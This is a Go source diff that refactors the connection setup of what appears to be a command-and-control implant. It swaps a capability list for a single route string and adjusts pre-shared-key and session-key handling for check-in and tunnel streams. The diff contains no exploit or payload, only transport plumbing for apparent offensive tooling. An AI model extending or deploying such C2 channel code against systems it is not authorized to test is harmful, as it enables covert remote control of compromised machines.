@@ -23,7 +23,7 @@ import (
 // auxiliary route (FTP/WWW/proxy) stream is immediately re-keyed to the
 // ephemeral PFS session key negotiated on the message tunnel — all subsequent
 // frames of the session use the PFS key, never the static PSK.
-func EstablishC2Connection(url, streamID string, capabilities ...string) (conn io.ReadWriteCloser, ctx context.Context, cancel context.CancelFunc, err error) {
+func EstablishC2Connection(url, streamID, route string) (conn io.ReadWriteCloser, ctx context.Context, cancel context.CancelFunc, err error) {
 	ctx, cancel = context.WithCancel(context.Background())
 	mode := common.RuntimeConfig.C2ChannelMode
 	if mode == "" {
@@ -50,16 +50,14 @@ func EstablishC2Connection(url, streamID string, capabilities ...string) (conn i
 		return nil, nil, nil, err
 	}
 
-	caps, capErr := normalizeMsgAuthCapabilities(capabilities)
-	if capErr != nil {
-		err = fmt.Errorf("normalize MsgAuth capabilities: %w", capErr)
+	if route == "" {
 		_ = rw.Close()
 		cancel()
-		return nil, nil, nil, err
+		return nil, nil, nil, fmt.Errorf("missing MsgAuth route")
 	}
 
 	secureConn := transport.NewSecureConn(rw)
-	if sendErr := sendMsgAuthEnvelope(secureConn, caps, streamID); sendErr != nil {
+	if sendErr := sendMsgAuthEnvelope(secureConn, route, streamID); sendErr != nil {
 		err = fmt.Errorf("send MsgAuth: %w", sendErr)
 		_ = rw.Close()
 		cancel()
@@ -71,14 +69,14 @@ func EstablishC2Connection(url, streamID string, capabilities ...string) (conn i
 	// ephemeral PFS session key. Check-in and the message tunnel are bootstrap
 	// routes: they run BEFORE (and negotiate) the PFS handshake, so they must
 	// stay on the PSK until the tunnel handshake completes inside MsgTunneler.
-	if !isBootstrapRoute(caps) {
+	if !isBootstrapRoute(route) {
 		// Acquire a reference so a concurrent message-tunnel teardown (which
 		// clears the current key for reconnect/check-in) cannot yank the key
 		// out mid-setup: the relay must use the SAME key the C2 re-keys this
 		// stream with, or the first data frame fails to decrypt.
 		if sessionKey := acquireSessionKey(); len(sessionKey) > 0 {
 			secureConn.SetKey(sessionKey)
-			logging.Debugf("EstablishC2Connection: re-keyed %v stream to ephemeral PFS session key", caps)
+			logging.Debugf("EstablishC2Connection: re-keyed %q stream to ephemeral PFS session key", route)
 			releaseSessionKey()
 		}
 	}
@@ -86,17 +84,12 @@ func EstablishC2Connection(url, streamID string, capabilities ...string) (conn i
 	return secureConn, ctx, cancel, nil
 }
 
-// isBootstrapRoute reports whether the given MsgAuth capabilities target the
+// isBootstrapRoute reports whether the given MsgAuth route targets the
 // check-in or message-tunnel route. Those two routes run the pre-handshake
 // protocol and are always encrypted with the static per-build PSK.
-func isBootstrapRoute(caps []string) bool {
+func isBootstrapRoute(route string) bool {
 	routes := &common.RuntimeConfig.C2Routes
-	for _, c := range caps {
-		if c == routes.Checkin || c == routes.Msg {
-			return true
-		}
-	}
-	return false
+	return route == routes.Checkin || route == routes.Msg
 }
 
 func establishChannelStream(ctx context.Context, url string, channelWrapper transport.C2ChannelWrapper) (io.ReadWriteCloser, error) {
@@ -124,23 +117,4 @@ func establishChannelStream(ctx context.Context, url string, channelWrapper tran
 	case <-time.After(10 * time.Second):
 		return nil, fmt.Errorf("establish channel stream timeout")
 	}
-}
-
-func normalizeMsgAuthCapabilities(capabilities []string) ([]string, error) {
-	seen := make(map[string]struct{}, len(capabilities)+1)
-	normalized := make([]string, 0, len(capabilities)+1)
-	for _, cap := range capabilities {
-		if cap == "" {
-			continue
-		}
-		if _, ok := seen[cap]; ok {
-			continue
-		}
-		seen[cap] = struct{}{}
-		normalized = append(normalized, cap)
-	}
-	if len(normalized) == 0 {
-		return nil, fmt.Errorf("at least one explicit MsgAuth capability is required")
-	}
-	return normalized, nil
 }
